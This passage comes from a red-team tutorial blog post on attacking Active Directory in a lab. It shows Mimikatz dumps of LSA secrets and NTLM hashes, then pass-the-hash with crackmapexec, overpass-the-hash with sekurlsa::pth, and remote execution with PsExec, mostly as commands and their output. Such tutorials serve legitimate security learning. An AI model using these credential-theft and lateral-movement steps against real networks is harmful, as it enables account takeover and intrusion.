         <span class="o">*</span> <span class="n">Domain</span>   <span class="o">:</span> <span class="n">CONTROLLER</span>
         <span class="o">*</span> <span class="n">Password</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="o">:</span>
         <span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">DOMAIN</span><span class="o">-</span><span class="n">CONTROLL</span><span class="err">$</span>
         <span class="o">*</span> <span class="n">Domain</span>   <span class="o">:</span> <span class="n">CONTROLLER</span><span class="p">.</span><span class="n">local</span>
         <span class="o">*</span> <span class="n">Password</span> <span class="o">:</span> <span class="mi">32</span> <span class="n">af</span> <span class="mi">6</span><span class="n">b</span> <span class="mo">07</span> <span class="mi">78</span> <span class="mi">2</span><span class="n">a</span> <span class="n">f0</span> <span class="n">f5</span> <span class="mi">32</span> <span class="n">bd</span> <span class="mo">01</span> <span class="mi">59</span> <span class="n">fb</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">40</span> <span class="mi">10</span> <span class="mi">6</span><span class="n">e</span> <span class="n">a7</span> <span class="mo">03</span> <span class="n">f9</span> <span class="n">ec</span> <span class="n">d8</span> <span class="mi">23</span> <span class="n">de</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">08</span> <span class="mi">10</span> <span class="mi">10</span> <span class="mi">74</span> <span class="n">b5</span> <span class="mi">60</span> <span class="n">bb</span> <span class="n">f4</span> <span class="n">c5</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">5</span><span class="n">f</span> <span class="mi">42</span> <span class="n">e3</span> <span class="mi">71</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">41</span> <span class="mi">31</span> <span class="mi">2</span><span class="n">f</span> <span class="n">d2</span> <span class="mi">17</span> <span class="n">db</span> <span class="mi">2</span><span class="n">c</span> <span class="n">e1</span> <span class="n">c3</span> <span class="n">d7</span> <span class="mi">51</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">45</span> <span class="mi">79</span> <span class="n">e4</span> <span class="mi">9</span><span class="n">a</span> <span class="n">ec</span> <span class="n">ab</span> <span class="mi">63</span> <span class="n">bb</span> <span class="mi">4</span><span class="n">a</span> <span class="n">ce</span> <span class="n">c1</span> <span class="n">dc</span> <span class="mi">20</span> <span class="mi">28</span> <span class="mi">6</span><span class="n">d</span> <span class="n">c7</span> <span class="mi">50</span> <span class="n">a0</span> <span class="mi">28</span> <span class="mo">03</span> <span class="n">a4</span> <span class="mi">7</span><span class="n">b</span> <span class="n">c1</span> <span class="mo">02</span> <span class="n">d8</span> <span class="mi">3</span><span class="n">b</span> <span class="n">c6</span> <span class="mi">19</span> <span class="mi">09</span> <span class="mi">31</span> <span class="mi">8</span><span class="n">c</span> <span class="mi">41</span> <span class="mi">90</span> <span class="n">c6</span> <span class="mi">20</span> <span class="n">fa</span> <span class="n">c4</span> <span class="mi">7</span><span class="n">b</span> <span class="n">ef</span> <span class="mi">4</span><span class="n">b</span> <span class="n">cf</span> <span class="n">c1</span> <span class="mi">86</span> <span class="n">c7</span> <span class="mi">95</span> <span class="n">f9</span> <span class="mi">60</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">35</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">10</span> <span class="n">c8</span> <span class="n">ee</span> <span class="mi">37</span> <span class="mi">54</span> <span class="mi">45</span> <span class="mi">3</span><span class="n">e</span> <span class="mi">30</span> <span class="mi">30</span> <span class="mi">92</span> <span class="n">b1</span> <span class="n">b3</span> <span class="mi">85</span> <span class="n">e3</span> <span class="n">bd</span> <span class="n">e7</span> <span class="mi">55</span> <span class="mi">22</span> <span class="mi">88</span> <span class="mi">36</span> <span class="mi">82</span> <span class="mi">95</span> <span class="n">a7</span> <span class="n">db</span> <span class="mi">71</span> <span class="n">fa</span> <span class="n">b7</span> <span class="mi">50</span> <span class="mi">1</span><span class="n">d</span> <span class="n">ce</span> <span class="mi">08</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">77</span> <span class="mi">9</span><span class="n">d</span> <span class="mo">02</span> <span class="n">dd</span> <span class="mi">68</span> <span class="mi">8</span><span class="n">f</span> <span class="n">f7</span> <span class="n">ed</span> <span class="mi">1</span><span class="n">e</span> <span class="n">ac</span> <span class="mi">56</span> <span class="n">c5</span> <span class="mi">3</span><span class="n">f</span> <span class="n">c3</span> <span class="n">e1</span> <span class="n">cb</span> <span class="n">ba</span> <span class="n">ef</span> <span class="mo">01</span> <span class="mi">79</span> <span class="mi">0</span><span class="n">c</span> <span class="n">d4</span> <span class="n">cb</span> <span class="n">b2</span> <span class="mi">36</span> <span class="mi">40</span> <span class="mi">12</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">36</span> <span class="mi">6</span><span class="n">a</span> <span class="n">a5</span> <span class="mi">92</span> <span class="mi">78</span> <span class="mi">8</span><span class="n">c</span> <span class="n">bf</span> <span class="mi">44</span> <span class="n">c2</span> <span class="mi">28</span> <span class="mi">27</span> <span class="n">de</span> <span class="mo">00</span> <span class="mi">68</span> <span class="mo">06</span> <span class="mi">3</span><span class="n">c</span> <span class="mi">4</span><span class="n">d</span> <span class="n">dc</span> <span class="mi">15</span> <span class="mi">44</span> <span class="mi">5</span><span class="n">e</span> <span class="mi">81</span> <span class="n">f8</span> <span class="mi">26</span> <span class="mi">19</span> <span class="n">e7</span> <span class="mi">0</span><span class="n">c</span> <span class="n">ca</span> <span class="mi">3</span><span class="n">e</span> <span class="n">e3</span> <span class="n">f3</span> <span class="n">d8</span> <span class="n">ab</span> <span class="n">ee</span> <span class="n">cb</span> <span class="mo">01</span> <span class="mi">8</span><span class="n">e</span> <span class="mi">7</span><span class="n">c</span> <span class="mi">9</span><span class="n">f</span> <span class="n">ba</span> <span class="n">b4</span> <span class="mi">66</span> <span class="n">dc</span> <span class="mi">66</span> <span class="n">af</span> <span class="mi">9</span><span class="n">c</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">99</span> <span class="mi">8</span><span class="n">b</span> <span class="n">c8</span> <span class="n">fb</span> <span class="mo">02</span> <span class="n">bd</span> <span class="mi">3</span><span class="n">f</span> <span class="mi">45</span> <span class="n">d7</span> <span class="mi">3</span><span class="n">f</span> <span class="mi">42</span> <span class="n">e3</span> <span class="n">e8</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">25</span> <span class="mi">7</span><span class="n">e</span> <span class="mi">72</span> <span class="mi">48</span> <span class="n">b5</span> <span class="mi">38</span> <span class="n">a8</span> <span class="mi">33</span> <span class="mi">94</span> <span class="mi">20</span> <span class="mi">5</span><span class="n">e</span> <span class="mi">3</span><span class="n">d</span> <span class="n">b8</span> <span class="n">c6</span> <span class="mi">66</span> <span class="mi">93</span>
        <span class="n">ssp</span> <span class="o">:</span>
        <span class="n">credman</span> <span class="o">:</span>
    
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">patch</span>
<span class="n">Domain</span> <span class="o">:</span> <span class="n">CONTROLLER</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">849420856</span><span class="o">-</span><span class="mi">2351964222</span><span class="o">-</span><span class="mi">986696166</span>

<span class="n">RID</span>  <span class="o">:</span> <span class="mo">000001</span><span class="n">f4</span> <span class="p">(</span><span class="mi">500</span><span class="p">)</span>
<span class="n">User</span> <span class="o">:</span> <span class="n">Administrator</span>
<span class="n">LM</span>   <span class="o">:</span>
<span class="n">NTLM</span> <span class="o">:</span> <span class="mi">2777</span><span class="n">b7fec870e04dda00cd7260f7bee6</span>

<span class="n">RID</span>  <span class="o">:</span> <span class="mo">0000044</span><span class="n">f</span> <span class="p">(</span><span class="mi">1103</span><span class="p">)</span>
<span class="n">User</span> <span class="o">:</span> <span class="n">Machine1</span>
<span class="n">LM</span>   <span class="o">:</span>
<span class="n">NTLM</span> <span class="o">:</span> <span class="mi">64</span><span class="n">f12cddaa88057e06a81b54e73b949b</span>

<span class="n">RID</span>  <span class="o">:</span> <span class="mo">00000451</span> <span class="p">(</span><span class="mi">1105</span><span class="p">)</span>
<span class="n">User</span> <span class="o">:</span> <span class="n">Admin2</span>
<span class="n">LM</span>   <span class="o">:</span>
<span class="n">NTLM</span> <span class="o">:</span> <span class="mi">2</span><span class="n">b576acbe6bcfda7294d6bd18041b8fe</span>
</pre></table></code></div></div><p>‌</p><h3 id="pass-the-hash"><strong>Pass The Hash</strong></h3><p>The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user’s NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.</p><p>the hash that we will try</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>Muhammad:acbc1d7e615194dfb894cb03e0a9c91f
root@kali: crackmapexec smb 192.168.219.0/24 <span class="nt">-u</span> <span class="s2">"Muhammad"</span> <span class="nt">-H</span> acbc1d7e615194dfb894cb03e0a9c91f <span class="nt">--local-auth</span>
SMB         192.168.219.132 445    SPIDERMAN        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:SPIDERMAN<span class="o">)</span> <span class="o">(</span>domain:SPIDERMAN<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         192.168.219.131 445    HYDRA-DC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:HYDRA-DC<span class="o">)</span> <span class="o">(</span>domain:HYDRA-DC<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         192.168.219.130 445    THEPUNISHER      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:THEPUNISHER<span class="o">)</span> <span class="o">(</span>domain:THEPUNISHER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         192.168.219.132 445    SPIDERMAN        <span class="o">[</span>+] SPIDERMAN<span class="se">\M</span>uhammad acbc1d7e615194dfb894cb03e0a9c91f 
SMB         192.168.219.131 445    HYDRA-DC         <span class="o">[</span>-] HYDRA-DC<span class="se">\M</span>uhammad:acbc1d7e615194dfb894cb03e0a9c91f STATUS_LOGON_FAILURE 
SMB         192.168.219.130 445    THEPUNISHER      <span class="o">[</span>+] THEPUNISHER<span class="se">\M</span>uhammad acbc1d7e615194dfb894cb03e0a9c91f 
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMBOY20_X9iTk49o0V1%2F-MMBVv4UaWyT775Q9OGH%2FPass%20the%20hash.png?alt=media&amp;token=a9bb1839-2d55-4041-9060-675c75bac5dd" alt="Pass The Hash" /></p><h3 id="overpass-the-hash"><strong>Overpass The Hash</strong></h3><p>In some cases, if you got the user’s hash you may not be able to crack it or use it in pass the hash attack for many reasons. example: disabled NTLM authentication. The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.let’s Assume first that we are on anther machine (SPIDERMAN) as <strong>ppraker</strong> user. and we want to gain access to <strong>fcastle</strong> user only with his NTLM hash. A simple way to do this is again with the <strong>sekurlsa::pth</strong> command from Mimikatz.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">pth</span> <span class="o">/</span><span class="n">user</span><span class="o">:</span><span class="n">fcatle</span> <span class="o">/</span><span class="n">domain</span><span class="o">:</span><span class="n">Marvel</span><span class="p">.</span><span class="n">local</span> <span class="o">/</span><span class="n">ntlm</span><span class="o">:</span><span class="n">e2b475c11da2a0748290d</span>
<span class="mi">87</span><span class="n">aa966c327</span> <span class="o">/</span><span class="n">run</span><span class="o">:</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span>
<span class="n">user</span> <span class="o">:</span> <span class="n">fcastle</span>
<span class="n">domain</span> <span class="o">:</span> <span class="n">Marvel</span><span class="p">.</span><span class="n">local</span>
<span class="n">program</span> <span class="o">:</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
<span class="n">impers</span><span class="p">.</span> <span class="o">:</span> <span class="n">no</span>
<span class="n">NTLM</span> <span class="o">:</span> <span class="n">e2b475c11da2a0748290d87aa966c327</span>
<span class="o">|</span> <span class="n">PID</span> <span class="mi">4832</span>
<span class="o">|</span> <span class="n">TID</span> <span class="mi">2268</span>
<span class="o">|</span> <span class="n">LSA</span> <span class="n">Process</span> <span class="n">is</span> <span class="n">now</span> <span class="n">R</span><span class="o">/</span><span class="n">W</span>
<span class="o">|</span> <span class="n">LUID</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">1197687</span> <span class="p">(</span><span class="mo">00000000</span><span class="o">:</span><span class="mo">00124677</span><span class="p">)</span>
<span class="err">\</span><span class="n">_</span> <span class="n">msv1_0</span> <span class="o">-</span> <span class="n">data</span> <span class="n">copy</span> <span class="err">@</span> <span class="mf">040E5614</span> <span class="o">:</span> <span class="n">OK</span> <span class="o">!</span>
<span class="err">\</span><span class="n">_</span> <span class="n">kerberos</span> <span class="o">-</span> <span class="n">data</span> <span class="n">copy</span> <span class="err">@</span> <span class="mf">040E5438</span>
<span class="err">\</span><span class="n">_</span> <span class="n">aes256_hmac</span> <span class="o">-&gt;</span> <span class="n">null</span>
<span class="err">\</span><span class="n">_</span> <span class="n">aes128_hmac</span> <span class="o">-&gt;</span> <span class="n">null</span>
<span class="err">\</span><span class="n">_</span> <span class="n">rc4_hmac_nt</span> <span class="n">OK</span>
<span class="err">\</span><span class="n">_</span> <span class="n">rc4_hmac_old</span> <span class="n">OK</span>
<span class="err">\</span><span class="n">_</span> <span class="n">rc4_md4</span> <span class="n">OK</span>
<span class="err">\</span><span class="n">_</span> <span class="n">rc4_hmac_nt_exp</span> <span class="n">OK</span>
<span class="err">\</span><span class="n">_</span> <span class="n">rc4_hmac_old_exp</span> <span class="n">OK</span>
<span class="err">\</span><span class="n">_</span> <span class="o">*</span><span class="n">Password</span> <span class="n">replace</span> <span class="o">-&gt;</span> <span class="n">null</span>

</pre></table></code></div></div><p>Now, we have a new PowerShell session that allows us to execute commands as <strong>facstle</strong>. So let’s make any kerberos connection to cache our TGT ticket.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>PS C:\Windows\system32&gt; klist
Current LogonId is 0:0x1583ae
Cached Tickets: (0)
PS C:\Windows\system32&gt; net use \\SPIDERMAN
The command completed successfully.
PS C:\Windows\system32&gt; klist
Current LogonId is 0:0x1583ae
Cached Tickets: (3)
#0&gt; Client: fcastle @ Marvel.local
Server: krbtgt/Marvel.local @ Marvel.local
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canoni
Start Time: 2/12/2018 13:59:40 (local)
End Time: 2/12/2018 23:59:40 (local)
Renew Time: 2/19/2018 13:59:40 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0x2 -&gt; DELEGATION
Kdc Called: DC01.corp.com
#1&gt; Client: jeff_admin @ CORP.COM
Server: krbtgt/CORP.COM @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonica
</pre></table></code></div></div><p>We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of fcastle in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller. Let’s try that now, running ./PsExec.exe to launch cmd.exe remotely on the \THEPHUNISHER machine as fcastle:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">PS</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Tools</span><span class="err">\</span><span class="n">active_directory</span><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="err">\\</span><span class="n">THEPHUNISHER</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
<span class="n">PsExec</span> <span class="n">v2</span><span class="p">.</span><span class="mi">2</span> <span class="o">-</span> <span class="n">Execute</span> <span class="n">processes</span> <span class="n">remotely</span>
<span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2001</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
<span class="n">Sysinternals</span> <span class="o">-</span> <span class="n">www</span><span class="p">.</span><span class="n">sysinternals</span><span class="p">.</span><span class="n">com</span>
<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">marvel</span><span class="err">\</span><span class="n">fcastle</span>
</pre></table></code></div></div><h2 id="credits"><strong>Credits</strong></h2><p>As we went through this serias we used many resources to help us create our serias. Thanks a lot ot all of these resources for helping me creating this.</p><p><a href="https://adsecurity.org/">adsecurity.org</a></p><p><a href="https://blog.redforce.io/">Redforce – Always Stay Ahead!</a></p><p><a href="https://tryhackme.com/room/attackingkerberos">TryHackMe</a></p><p><a href="https://docs.axway.com/bundle/APIGateway_762_IntegrationKerberos_allOS_en_HTML5/page/Content/KerberosIntegration/kerberos_overview.htm">Kerberos authentication</a></p><p><a href="https://medium.com/@dewni.matheesha/kerberos-the-computer-network-authentication-protocol-a198309339b7">@dewni.matheesha</a></p><p><a href="https://www.youtube.com/watch?v=5N242XcKAsM">Destination Certification</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/active-directory-101/'>Active Directory 101</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active directory</a> <a href="/tags/redteaming/" class="post-tag no-text-decoration" >redteaming</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory Attacks - Muhammad Adel&url=https://itsfading.github.io/posts/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory Attacks - Muhammad Adel&u=https://itsfading.github.io/posts/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Active Directory Attacks - Muhammad Adel&url=https://itsfading.github.io/posts/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/"><div class="card-body"> <span class="timeago small" > Jul 26, 2024 <i class="unloaded">2024-07-26T19:52:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge</h3><div class="text-muted small"><p> TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerabi...</p></div></div></a></div><div class="card"> <a href="/posts/CRTP-Commands-CheatSheet/"><div class="card-body"> <span class="timeago small" > Dec 4 <i class="unloaded">2025-12-04T13:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CRTP Commands CheatSheet</h3><div class="text-muted small"><p> Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Computers Get-NetComputer | select dnshostname type .\pcs.txt | Resolve-IPAddress Get-NetForest -Forest moneycorp.local | sel...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Basics/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T17:20:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Basics</h3><div class="text-muted small"><p> Active directory overview what is Active directory? Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Enumeration/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory Enumeration</p></a> <a href="/posts/Cybertalents-xCorp-Web-Writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Cybertalents xCorp Web Challenge Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
